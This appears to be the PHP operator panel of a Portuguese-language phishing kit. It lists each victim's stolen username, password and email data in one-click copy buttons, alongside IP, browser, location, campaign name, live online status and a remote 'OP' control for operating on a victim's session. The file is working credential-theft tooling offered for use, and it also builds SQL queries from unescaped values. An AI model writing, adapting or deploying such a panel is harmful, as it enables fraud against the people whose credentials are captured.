<?php
session_start();

require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";

date_default_timezone_set('America/Sao_Paulo');

$dados = DBRead('infos', 'ORDER BY id DESC');

echo"<style>td{color:white;}</style><br><table class='table table-striped table-bordered m-0'>
<thead class='thead-dark'>
<tr>
<th style='width: 180px;'>#ID</th>
 <th style='width: 120px;'>#CAMP</th>

<th style='width: 120px;'>OP</th>
<th style='width: 280px; '>USUÁRIO</th>
<th style='width: 280px; '>SENHA</th>
<th style='width: 1080px; '>Dados do Email</th>
<th style='width: 220px;'>Status</th>
<th style='width: 220px;'>Comando</th>
<th style='width: 220px;'>Data/Hora</th>
<th style='width: 120px;'></th>
</tr></thead><tbody>"; ?>

<?php
if (is_array($dados) || is_object($dados)) {
	foreach ($dados as $info) {
		$tempo        = time();
		$id           = $info['id'];
		$ip           = $info['ip'];		
		$Sistema      = $info['sistema'];
		$Navegador    = $info['navegador'];
		$local        = $info['cidade_estado'];
		$dataacesso   = $info['datahora'];
		$status       = $info['status'];
		$op           = $info['op'];
		$camp           = $info['campanha'];
		//
		$usuario      = $info['usuario'];
		$senha        = $info['senha'];
		$dadosemail        = $info['dados_do_email'];
		
       //
		$comando      = $info['statusremote'];
		$tempo_online = $info['tempo'];
		$min          = $info['minuto'];
		$tempo        = time();
		$statysss     = $info['statusonline'];
		$dataehora    = date("d/m/Y h:i:s");
		$tempooff     = date("s");

		if ($tempooff == 59) {
			$minuto       = $min+1;
			$statusOnline = "ON";

			$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET minuto='$minuto', statusonline='$statusOnline' WHERE ip = '$ip' AND tempo <'$tempo'".-"5");
		}else{
			$minuto       = $min+1;
			$statusOnline = "OFF";

			$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET status='SAIU', statusonline='$statusOnline' WHERE ip = '$ip' AND tempo <'$tempo'".-"5");
		}

		
		if($op == ""){
	$operador = "Aguardando OP.";
}else{
	$operador = "Operando. ".$op;
}
$usuarioop = $camp;

		echo "<tr><td style=''><font size='3'>$id</font><br>$Navegador - $Sistema<br>$local</td>
 <td width='250px'> 
					 <font size='2' color='yellow' > $usuarioop </font>
					 </td>

		<td width='100px'>
		<ul class='list-inline m-0'><li>
		 <button href='javascript:void(0)' id='getremote' data-toggle='modal' data-target='#emp-remote' data-id=$id class='btn btn-danger' data-placement='top' title='Operar'>
					  
					  <font size='2' color='white' style='font-weight:bold;'>OP</font>
					  </button>
		
		</li></ul></td>
		
		<td>
		
		 <button class='btn' style='color: black; font-weight:bold; border: 1px dotted black; background-color: white;' data-clipboard-text='$usuario'>$usuario</button>
		</td>

		<td> <button class='btn' style='color: black; font-weight:bold; border: 1px dotted black; background-color: white;' data-clipboard-text='$senha'>$senha</button>
		</td>

		
		
		<td ><button class='btn' style='color: black; font-weight:bold; border: 1px dotted black; background-color: white;' data-clipboard-text='$dadosemail'>$dadosemail</button></td>

		

		<td ><font style='color:yellow;'> $status</font></td>
		<td ><font>$comando</font></td>
		<td >$dataacesso</td>

		<td class='text-center' >
		<ul class='list-inline m-0'>


		<li>
        <a href='javascript:void(0)' class='nav-link' id='bloquearip' data-id=$id  class='small text-danger' data-toggle='tooltip' data-placement='top' title='Bloquear IP'>
					  <svg xmlns='http://www.w3.org/2000/svg' width='25' height='25' fill='currentColor' class='bi bi-bug-fill' viewBox='0 0 16 16'>
  <path d='M4.978.855a.5.5 0 1 0-.956.29l.41 1.352A4.985 4.985 0 0 0 3 6h10a4.985 4.985 0 0 0-1.432-3.503l.41-1.352a.5.5 0 1 0-.956-.29l-.291.956A4.978 4.978 0 0 0 8 1a4.979 4.979 0 0 0-2.731.811l-.29-.956z'/>
  <path d='M13 6v1H8.5v8.975A5 5 0 0 0 13 11h.5a.5.5 0 0 1 .5.5v.5a.5.5 0 1 0 1 0v-.5a1.5 1.5 0 0 0-1.5-1.5H13V9h1.5a.5.5 0 0 0 0-1H13V7h.5A1.5 1.5 0 0 0 15 5.5V5a.5.5 0 0 0-1 0v.5a.5.5 0 0 1-.5.5H13zm-5.5 9.975V7H3V6h-.5a.5.5 0 0 1-.5-.5V5a.5.5 0 0 0-1 0v.5A1.5 1.5 0 0 0 2.5 7H3v1H1.5a.5.5 0 0 0 0 1H3v1h-.5A1.5 1.5 0 0 0 1 11.5v.5a.5.5 0 1 0 1 0v-.5a.5.5 0 0 1 .5-.5H3a5 5 0 0 0 4.5 4.975z'/>
</svg>

					</a>
		<a href='painel.php?Excluir=$id' class='small text-danger' data-toggle='tooltip' data-placement='top' title='Remover'><i class='fas fa-trash fa-fw'></i></a></li></ul></td></tr>";
		}
	}else{
		echo "<div style='color:black !important;'><center><h3>Aguardando infos!</h3></center></div>";
	}
?>


<script src="dist/clipboard.min.js"></script>
    <script>
        var btns = document.querySelectorAll('.btn');
        var clipboard = new ClipboardJS(btns);

        var clipboard_retorno = new ClipboardJS('#btn_retorno');
        clipboard_retorno.on('success', function (e) {
            console.info('Action:', e.action);
            console.info('Text:', e.text);
            console.info('Trigger:', e.trigger);

            document.querySelector('#btn_retorno').innerHTML = 'Copiado!';
            e.clearSelection();
        });
    </script>